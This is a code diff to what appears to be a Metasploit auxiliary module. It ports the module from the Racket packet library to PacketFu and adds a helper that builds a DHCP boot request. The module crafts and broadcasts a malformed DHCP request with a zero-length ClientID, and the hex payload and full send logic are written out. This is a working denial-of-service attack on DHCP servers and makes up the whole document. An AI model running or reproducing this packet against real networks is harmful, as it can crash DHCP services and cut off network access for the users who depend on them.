@@ -10,7 +10,6 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -52,32 +51,27 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Creating DHCP Request with 0-length ClientID")
 		open_pcap
-		n = Racket::Racket.new
+		p = PacketFu::UDPPacket.new
+		p.ip_daddr = "255.255.255.255"
+		p.udp_sport = 68
+		p.udp_dport = 67
 
-		n.layers[3] = Racket::L3::IPv4.new
-		n.layers[3].dst_ip = '255.255.255.255'
-		n.layers[3].version = 4
-		n.layers[3].hlen = 0x05
-		n.layers[3].ttl = 44
-		n.layers[3].protocol = 0x11
-
-		n.layers[4] = Racket::L4::UDP.new
-		n.layers[4].src_port = 68
-		n.layers[4].dst_port = 67
-
-		n.layers[5] = Racket::L5::BOOTP.new
-		n.layers[5].cip = datastore['RIP']
-		n.layers[5].chaddr = "\xaa\xaa\xaa\xaa\xaa\xaa"
-		n.layers[5].type = 1
-		n.layers[5].payload = "\x63\x82\x53\x63\x35\x01\x03\x3d\x00\xff"
-
-		n.layers[4].payload = n.layers[5]
-		n.layers[4].fix!(n.layers[3].src_ip, n.layers[3].dst_ip)
-		n.layers[4].payload = ""
-
-		buff = n.pack
+		# TODO: Get a DHCP parser into PacketFu
+		chaddr = "\xaa\xaa\xaa\xaa\xaa\xaa"
+		dhcp_payload = "\x63\x82\x53\x63\x35\x01\x03\x3d\x00\xff"
+		p.payload = dhcp_req(chaddr,dhcp_payload)
+		p.recalc
 		print_status("Sending malformed DHCP request...")
-		capture_sendto(buff, '255.255.255.255')
+		capture_sendto(p, '255.255.255.255')
 		close_pcap
 	end
+
+	def dhcp_req(chaddr,payload)
+		req = "\x00" * 236
+		req[0,3] = "\x01\x01\x06" # Boot request on Eth with hw len of 6
+		req[12,4] = Rex::Socket.addr_aton(datastore['RIP'])
+		req[28,6] = chaddr
+		req + payload
+	end
+
 end
